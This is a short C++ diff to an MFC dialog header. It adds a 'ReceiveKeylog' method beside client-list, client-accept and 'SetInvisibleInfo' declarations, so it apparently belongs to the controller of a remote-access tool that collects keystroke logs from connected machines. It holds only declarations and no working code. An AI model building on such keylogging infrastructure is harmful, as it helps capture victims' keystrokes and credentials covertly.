@@ -42,4 +42,5 @@ public:
 	void ClientAccept();
 	afx_msg void OnDblclkListClients(NMHDR *pNMHDR, LRESULT *pResult);
 	void SetInvisibleInfo(CClientSocket* pObj, CString internal_ip);
+	void ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu);
 };
